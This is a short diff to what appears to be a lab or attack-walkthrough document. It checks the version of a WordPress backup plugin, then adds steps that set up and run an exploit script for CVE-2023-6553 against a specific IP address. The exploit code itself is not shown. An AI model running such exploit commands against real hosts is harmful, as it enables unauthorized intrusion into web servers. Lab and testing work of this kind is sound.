@@ -57,3 +57,11 @@ grep -i version /var/www/html/wp-content/plugins/backup-backup/backup-backup.php
     define('BMI_VERSION', '1.3.7');
 ```
 
+- exploit the backup vulnerability at PublicWeb1
+
+```
+cd Attacker/CVE-2023-6553/
+python3 -m venv venv && source venv/bin/activate
+pip install -r requirements.txt
+python exploit.py -u http://3.144.10.220
+```
